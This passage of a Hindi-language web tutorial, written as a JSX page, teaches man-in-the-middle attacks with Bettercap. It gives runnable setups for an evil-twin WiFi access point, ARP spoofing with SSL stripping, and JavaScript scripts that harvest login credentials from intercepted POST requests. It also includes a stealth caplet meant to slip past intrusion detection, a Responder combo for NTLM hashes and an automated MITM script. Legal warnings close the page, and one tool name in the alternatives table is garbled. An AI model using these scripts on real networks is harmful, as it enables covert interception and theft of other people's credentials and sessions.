          { q: 'कितने टार्गेट्स एक साथ?', a: 'कम्प्यूटर की पावर पर डिपेंड करता है। 10-20 टार्गेट्स आसानी से हैंडल हो जाते हैं। पूरे सबनेट के लिए: 192.168.1.0/24' },
          { q: 'विंडोज़ पर चलता है?', a: 'हाँ, Go में लिखा है इसलिए क्रॉस-प्लेटफ़ॉर्म है। लेकिन WiFi अटैक्स के लिए Linux ज़रूरी है।' },
          { q: 'कैपलेट्स कहाँ मिलेंगे?', a: 'sudo bettercap -eval "caplets.update" से डाउनलोड करो। /usr/share/bettercap/caplets/ में मिलेंगे। GitHub पर भी community caplets हैं।' },
          { q: 'HTTPS ट्रैफ़िक कैप्चर कैसे करें?', a: 'SSL strip से HTTPS → HTTP convert होता है (HSTS sites पर काम नहीं करता)। Bettercap CA certificate install करके HTTPS intercept कर सकते हो।' },
          { q: 'BLE अटैक्स कैसे करें?', a: 'BLE module support चाहिए। ble.recon on से scan करो। BLE devices की info मिलेगी — name, address, manufacturer, RSSI, UUIDs।' },
          { q: 'पूरे सबनेट पर MITM कैसे करें?', a: 'set arp.spoof.targets 192.168.1.0/24 सेट करो। ध्यान रखो — बहुत सारे targets पर performance impact हो सकता है।' },
          { q: 'क्या Bettercap v1 और v2 में क्या फ़र्क है?', a: 'v1 Python में था (पुराना), v2 Go में है (नया, तेज़)। v2 में WiFi, BLE, web UI, caplet system, JavaScript engine सब नए हैं। v1 अब maintain नहीं होता।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>WiFi Evil Twin Attack</h2>
      <p>
        Evil Twin अटैक में एक फ़र्ज़ी WiFi AP बनाया जाता है जो ओरिजिनल AP जैसा दिखता है। विक्टिम फ़र्ज़ी AP से कनेक्ट करता है और उसका सारा ट्रैफ़िक अटैकर के थ्रू जाता है। Bettercap + hostapd कॉम्बो से यह अटैक कर सकते हो। यह सबसे ख़तरनाक WiFi अटैक है क्योंकि विक्टिम को पता ही नहीं चलता कि वो फ़र्ज़ी AP से कनेक्टेड है। कैफ़े, एयरपोर्ट, होटल जैसे public places पर यह अटैक बहुत आसान है।
      </p>
      <CodeBlock
        title="Evil Twin Setup"
        code={`# hostapd.conf बनाएं:
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# hostapd शुरू करें:
sudo hostapd hostapd.conf

# DHCP सर्वर (dnsmasq):
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.50,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

# dnsmasq शुरू करें:
sudo dnsmasq -C dnsmasq.conf

# IP फ़ॉरवर्डिंग:
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# Bettercap MITM:
sudo bettercap -iface wlan0
# arp.spoof on, net.sniff on`}
      />

      <h2>JavaScript Scripting</h2>
      <p>
        Bettercap में JavaScript स्क्रिप्ट्स लिखकर कस्टम लॉजिक बना सकते हो। यह कैपलेट्स से ज़्यादा पावरफुल है। JavaScript engine V8 पर based है और full JS syntax support करता है। onRequest(), onResponse(), और onLoad() functions define करके traffic processing logic लिख सकते हो। Custom scripts से credential harvesting, traffic modification, और automated attacks बना सकते हो।
      </p>
      <CodeBlock
        title="JavaScript Script Example"
        code={`// custom.js — कस्टम लॉजिक
// HTTP रिक्वेस्ट इंटरसेप्ट:
function onResponse(req, res) {
    if (req.Hostname.includes("target.com")) {
        console.log("URL: " + req.Url);
        console.log("Method: " + req.Method);

        // बॉडी मॉडिफ़ाई करो:
        if (res.Body) {
            res.Body = res.Body.replace(
                "original", "modified"
            );
        }
    }
}

// क्रेडेंशियल डिटेक्ट:
function onRequest(req) {
    if (req.Method == "POST") {
        if (req.Body.includes("password")) {
            console.log("CRED: " + req.Body);
        }
    }
}

// रन: bettercap -script custom.js`}
      />
      <CodeBlock
        title="Credential Harvester Script"
        code={`// cred-harvest.js — लॉगिन फ़ॉर्म्स से क्रेडेंशियल्स
var credentials = [];

function onRequest(req) {
    var body = req.Body || "";
    var url = req.Url || "";

    // लॉगिन एंडपॉइंट्स डिटेक्ट:
    var loginPaths = [
        "/login", "/signin", "/auth",
        "/api/login", "/wp-login"
    ];

    for (var i = 0; i < loginPaths.length; i++) {
        if (url.includes(loginPaths[i]) &&
            req.Method == "POST") {
            var cred = {
                url: url,
                body: body,
                time: new Date().toISOString()
            };
            credentials.push(cred);
            console.log("[CRED] " + JSON.stringify(cred));
        }
    }
}

// रन: bettercap -script cred-harvest.js`}
      />

      <h2>Stealth Techniques</h2>
      <p>
        डिटेक्शन से बचने के लिए Bettercap में कई स्टील्थ टेक्निक्स हैं। ARP रेट लिमिटिंग, साइलेंट मोड, और स्टील्थ कैपलेट्स यूज़ कर सकते हो। नेटवर्क में IDS/IPS systems हों तो ये techniques ज़रूरी हैं। ARP packets की frequency कम करने से anomaly detectors trigger नहीं होते।
      </p>
      <p>
        स्टील्थ mode में ARP spoofing बहुत slow rate से होती है — हर 60-120 seconds में एक packet। इससे network overhead कम होता है और detection tools को alert नहीं होता। net.sniff.verbose false करने से console output बंद हो जाता है। Silent mode में Bettercap background में quietly काम करता है।
      </p>

      <h2>HID (Human Interface Device) Attacks</h2>
      <p>
        Bettercap v2 में HID attacks support है। USB Rubber Ducky जैसे attacks बिना hardware के कर सकते हो। HID module से keyboard injection attacks possible हैं — target computer पर keystrokes inject करके commands execute कर सकते हो।
      </p>
      <CodeBlock
        title="HID Attack Example"
        code={`# HID module activate करो:
# Bettercap कंसोल में:

# BLE HID device emulate करो:
ble.show

# HID keystroke injection:
# टार्गेट डिवाइस पर keystrokes भेजो
# यह Bluetooth Low Energy के through होता है

# नोट: HID attacks के लिए BLE support ज़रूरी है
# और target device pair होना चाहिए`}
      />
      <CodeBlock
        title="Stealth Caplet"
        code={`# stealth.cap — डिटेक्शन से बचो:
# ARP रेट लिमिट (स्लो स्पूफ़):
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex on

# स्निफ़िंग साइलेंट:
set net.sniff.verbose false

# ARP इंटरवल बढ़ाओ (डिटेक्शन से बचो):
# डिफ़ॉल्ट: हर 30 सेकंड
# स्टील्थ: हर 60-120 सेकंड

arp.spoof on
net.sniff on

# रन: sudo bettercap -caplet stealth.cap`}
      />

      <h2>Integration with Other Tools</h2>
      <p>
        Bettercap को दूसरे सिक्योरिटी टूल्स के साथ इंटीग्रेट करके पावरफुल अटैक वर्कफ़्लो बना सकते हो।
      </p>
      <CodeBlock
        title="Bettercap + Burp Suite"
        code={`# Bettercap HTTP प्रॉक्सी → Burp Suite:
# टार्गेट का ट्रैफ़िक Burp में भेजो

# Bettercap कंसोल में:
set arp.spoof.targets 192.168.1.100
set http.proxy.sslstrip true
set http.proxy.script redirect_to_burp.js
http.proxy on
arp.spoof on

# redirect_to_burp.js:
function onRequest(req) {
    req.SetHeader("X-Forwarded-For", "127.0.0.1");
}

# Burp Suite में upstream proxy सेट करो:
# Project Options > Connections > Upstream Proxy
# Proxy: 127.0.0.1:8080`}
      />
      <CodeBlock
        title="Bettercap + Responder Combo"
        code={`# LLMNR/NBT-NS पॉइज़निंग + MITM:
# Terminal 1: Bettercap
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on

# Terminal 2: Responder
sudo responder -I eth0 -wrf

# दोनों मिलकर क्रेडेंशियल्स कैप्चर करेंगे:
# - Bettercap: HTTP/FTP/DNS क्रेडेंशियल्स
# - Responder: NTLMv2 हैशेज़`}
      />

      <h2>Scripting and Automation</h2>
      <p>
        Bettercap को ऑटोमेट करके रिपीटेटिव अटैक्स आसान बना सकते हो। कैपलेट्स, शेल स्क्रिप्ट्स, और JavaScript सब यूज़ कर सकते हो।
      </p>
      <CodeBlock
        title="Auto-MITM Script"
        code={`#!/bin/bash
# auto-mitm.sh — ऑटोमेटेड MITM अटैक
IFACE=$1
TARGET=$2

if [ -z "$IFACE" ] || [ -z "$TARGET" ]; then
    echo "Usage: $0 <interface> <target-ip>"
    exit 1
fi

# IP फ़ॉरवर्डिंग:
echo 1 > /proc/sys/net/ipv4/ip_forward

# कैपलेट बनाएं:
cat > /tmp/auto.cap << EOF
set arp.spoof.targets $TARGET
set arp.spoof.fullduplex on
set http.proxy.sslstrip true
set net.sniff.verbose true
set net.sniff.output /tmp/capture_\$(date +%Y%m%d_%H%M%S).pcap
http.proxy on
arp.spoof on
net.sniff on
EOF

echo "[*] MITM शुरू हो रहा है..."
echo "[*] टार्गेट: $TARGET"
echo "[*] इंटरफ़ेस: $IFACE"

sudo bettercap -iface $IFACE -caplet /tmp/auto.cap`}
      />
      <CodeBlock
        title="Network Monitoring Cron Job"
        code={`# क्रॉन जॉब — नेटवर्क मॉनिटरिंग:
# crontab -e

# हर घंटे नेटवर्क स्कैन:
0 * * * * sudo bettercap -eval "net.probe on; net.show; net.probe off" >> /var/log/network.log 2>&1

# डेली WiFi रेकन:
0 6 * * * sudo bettercap -eval "wifi.recon on; sleep 30; wifi.show; wifi.recon off" >> /var/log/wifi.log 2>&1

# अलर्ट — नए डिवाइस डिटेक्ट:
# स्क्रिप्ट: new_device_alert.sh
#!/bin/bash
PREV=$(cat /tmp/known_devices.txt 2>/dev/null)
CURRENT=$(sudo bettercap -eval "net.show" | grep -v "^$")
diff <(echo "$PREV") <(echo "$CURRENT") | grep ">" && echo "NEW DEVICE DETECTED!" | mail -s "Alert" admin@example.com
echo "$CURRENT" > /tmp/known_devices.txt`}
      />

      <h2>Performance Tuning</h2>
      <p>
        बड़े नेटवर्क्स पर Bettercap की परफ़ॉर्मेंस ऑप्टिमाइज़ करनी पड़ती है। पूरे सबनेट (192.168.1.0/24) पर ARP spoofing करने से CPU और memory usage बढ़ जाता है। Specific targets define करो ताकि unnecessary packets generate न हों। Sniffing filter लगाओ — सिर्फ ज़रूरी protocols capture करो।
      </p>
      <CodeBlock
        title="Performance Tips"
        code={`# स्निफ़िंग फ़िल्टर — सिर्फ ज़रूरी ट्रैफ़िक:
set net.sniff.filter "tcp port 80 or tcp port 443"

# वर्बोज़ बंद करो (CPU बचत):
set net.sniff.verbose false

# स्पेसिफ़िक टार्गेट — पूरा सबनेट नहीं:
set arp.spoof.targets 192.168.1.100,192.168.1.101

# PCAP साइज़ लिमिट:
set net.sniff.output /tmp/capture.pcap

# मेमोरी मॉनिटर:
# htop से CPU/RAM देखो

# नेटवर्क इंटरफ़ेस सही चुनो:
# Ethernet > WiFi (speed)
# Monitor mode WiFi (wireless attacks)`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Bettercap के कैप्चर्ड डेटा को एनालाइज़ करना ज़रूरी है। PCAP फ़ाइल्स Wireshark में ओपन कर सकते हो। Penetration test report बनाते समय captured evidence include करो — screenshots, packet captures, credential logs। Client को clearly दिखाओ कि क्या vulnerable है और कैसे fix करना है।
      </p>
      <p>
        Bettercap का net.sniff module automatically packets capture करता है। Output files में HTTP requests, DNS queries, FTP commands, और credentials store होते हैं। इन्हें analyze करके network security posture का assessment बना सकते हो। JSON output format में export करके automated analysis tools में import कर सकते हो।
      </p>
      <CodeBlock
        title="PCAP Analysis"
        code={`# PCAP फ़ाइल Wireshark में ओपन करो:
wireshark /tmp/capture.pcap

# tshark से कमांड लाइन एनालिसिस:
# HTTP रिक्वेस्ट्स:
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# DNS क्वेरीज़:
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name

# क्रेडेंशियल्स:
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# FTP पासवर्ड्स:
tshark -r capture.pcap -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg

# कनेक्शन समरी:
tshark -r capture.pcap -q -z conv,ip`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        Bettercap रियल-वर्ल्ड सिक्योरिटी टेस्टिंग में कैसे इस्तेमाल होता है:
      </p>
      <p>
        <strong className="text-white">Case Study 1 — Corporate Network Audit:</strong> एक पेनेट्रेशन टेस्टर ने क्लाइंट के ऑफ़िस नेटवर्क पर Bettercap यूज़ किया। ARP स्पूफ़िंग + HTTP प्रॉक्सी से 15 एम्प्लॉईज़ के HTTP लॉगिन क्रेडेंशियल्स कैप्चर हुए। 3 एम्प्लॉईज़ FTP पासवर्ड्स प्लेनटेक्स्ट में भेज रहे थे। रिपोर्ट में क्लाइंट को HTTPS enforce करने और FTP बंद करने की सलाह दी गई।
      </p>
      <p>
        <strong className="text-white">Case Study 2 — WiFi Security Assessment:</strong> एक कैफ़े के WiFi नेटवर्क का सिक्योरिटी ऑडिट किया गया। Bettercap से WiFi डीऑथ अटैक करके क्लाइंट्स को डिसकनेक्ट किया। Evil Twin AP बनाकर 20+ यूज़र्स ने फ़र्ज़ी AP से कनेक्ट किया। उनका सारा ट्रैफ़िक कैप्चर हुआ। कैफ़े को WPA3 और क्लाइंट आइसोलेशन लगाने की सलाह दी गई।
      </p>
      <p>
        <strong className="text-white">Case Study 3 — IoT Device Testing:</strong> एक स्मार्ट ऑफ़िस के IoT डिवाइसेज़ (प्रिंटर्स, कैमराज़, स्मार्ट लॉक्स) का टेस्ट किया गया। Bettercap BLE मॉड्यूल से 50+ BLE डिवाइसेज़ मिले। ARP स्पूफ़िंग से IoT डिवाइसेज़ का ट्रैफ़िक इंटरसेप्ट किया। 3 डिवाइसेज़ प्लेनटेक्स्ट में डेटा भेज रही थीं।
      </p>

      <h2>Common Attack Scenarios</h2>
      <p>
        Bettercap का इस्तेमाल कई तरह के अटैक सीनेरियोज़ में होता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Credential Sniffing:</strong> HTTP, FTP, IRC, IMAP प्रोटोकॉल्स से प्लेनटेक्स्ट क्रेडेंशियल्स कैप्चर करना</li>
        <li><strong className="text-white">Session Hijacking:</strong> HTTP cookies कैप्चर करके session hijack करना — विक्टिम का अकाउंट एक्सेस</li>
        <li><strong className="text-white">SSL Stripping:</strong> HTTPS → HTTP downgrade करके encrypted traffic पढ़ना</li>
        <li><strong className="text-white">DNS Spoofing:</strong> DNS रिस्पॉन्स modify करके विक्टिम को फ़र्ज़ी साइट पर भेजना</li>
        <li><strong className="text-white">WiFi Deauth:</strong> WiFi clients को deauthenticate करके evil twin AP से कनेक्ट कराना</li>
        <li><strong className="text-white">Traffic Monitoring:</strong> सारा नेटवर्क ट्रैफ़िक मॉनिटर करना — URLs, DNS queries, API calls</li>
      </ul>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">ख़ासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Ettercap</td><td className="py-2 px-3">MITM अटैक्स</td><td className="py-2 px-3">पुराना लेकिन स्टेबल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mitmproxy</td><td className="py-2 px-3">HTTP/HTTPS प्रॉक्सी</td><td className="py-2 px-3">स्क्रिप्टिंग के लिए बेस्ट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">arpspoof</td><td className="py-2 px-3">ARP स्पूफ़िंग</td><td className="py-2 px-3">सिंपल, सिंगल पर्पज़</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Responder</td><td className="py-2 px-3">LLMNR/NBT-NS पॉइज़निंग</td><td className="py-2 px-3">क्रेडेंशियल कैप्चर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">WiFi-Pumpkin</td><td className="py-2 px-3">Evil Twin AP</td><td className="py-2 px-3">WiFi MITM के लिए</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Yersinia</td><td className="py-2 px-3">L2 प्रोटोकॉल अटैक्स</td><td className="py-2 px-3">STP, DHCP, HSRP अटैक्स</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">M扫黑除ड</td><td className="py-2 px-3">MITM + WiFi</td><td className="py-2 px-3">Evil Twin + डीऑथ</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Hcxtools</td><td className="py-2 px-3">WiFi PMKID कैप्चर</td><td className="py-2 px-3">हैंडशेक + PMKID</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Bettercap का वेब UI बहुत यूज़फ़ुल है — रियल-टाइम में ट्रैफ़िक देख सकते हो</li>
          <li>कैपलेट्स बनाकर रिपीटेटिव अटैक्स ऑटोमेट करो — एक क्लिक में पूरा अटैक</li>
          <li>ARP स्पूफ़िंग + HTTP प्रॉक्सी + SSL strip = सबसे पावरफ़ुल MITM कॉम्बो</li>
          <li>WiFi अटैक्स के लिए USB adapter ज़रूरी है — Alfa AWUS036ACH बेस्ट है</li>
          <li>JavaScript स्क्रिप्टिंग से कस्टम लॉजिक बनाओ — कैपलेट्स से ज़्यादा पावरफुल</li>
          <li>स्टील्थ मोड यूज़ करो — ARP रेट लिमिट, साइलेंट मोड, लो-प्रोफ़ाइल</li>
          <li>PCAP फ़ाइल्स Wireshark में एनालाइज़ करो — डीप पैकेट इंस्पेक्शन</li>
          <li>डिफ़ेंस के लिए static ARP, DHCP snooping, और WPA3 यूज़ करो</li>
          <li>Evil Twin अटैक hostapd + Bettercap से — WiFi MITM का सबसे पावरफुल तरीका</li>
          <li>Responsible disclosure फ़ॉलो करो — सब कुछ लिखित अनुमति के साथ</li>
        </ul>
      </div>

      <h2>Legal and Ethical Considerations</h2>
      <p>
        Bettercap एक बहुत शक्तिशाली MITM टूल है और इसका इस्तेमाल करते समय कानूनी और नैतिक पहलुओं का ध्यान रखना ज़रूरी है। बिना अनुमति के नेटवर्क ट्रैफ़िक इंटरसेप्ट करना अधिकांश देशों में अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क इंटरसेप्शन एक गंभीर अपराध है।
      </p>
      <p>
        Penetration testing engagement में भी scope सीमित रखना ज़रूरी है। Client के authorized network के बाहर traffic intercept करना भी अवैध है। हमेशा Rules of Engagement (RoE) document बनाओ और उसमें clearly define करो कि क्या allowed है और क्या नहीं। Test के बाद सभी captured data securely delete करो।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">लिखित अनुमति:</strong> हमेशा लिखित authorization लो — verbal permission काफ़ी नहीं है</li>
        <li><strong className="text-white">Scope सीमित रखो:</strong> सिर्फ authorized network पर ही MITM करो</li>
        <li><strong className="text-white">Data Handling:</strong> captured traffic को securely handle करो — credentials leak न हों</li>
        <li><strong className="text-white">Report Everything:</strong> सभी findings document करो और client को report करो</li>
        <li><strong className="text-white">Clean Up:</strong> test के बाद सभी artifacts delete करो — logs, captures, configs</li>
        <li><strong className="text-white">Responsible Disclosure:</strong> third-party vulnerabilities मिलने पर responsible disclosure follow करो</li>
      </ul>

      <div className="warning-box mt-6">
        <strong>⚠️ फ़ाइनल वार्निंग:</strong> Bettercap एक बहुत शक्तिशाली MITM टूल है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और शैक्षिक उद्देश्यों के लिए करें। बिना अनुमति के नेटवर्क ट्रैफ़िक इंटरसेप्ट करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क इंटरसेप्शन में 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है। केवल अपने लैब में ही प्रैक्टिस करें।
      </div>
    </TutorialLayout>
  )
}
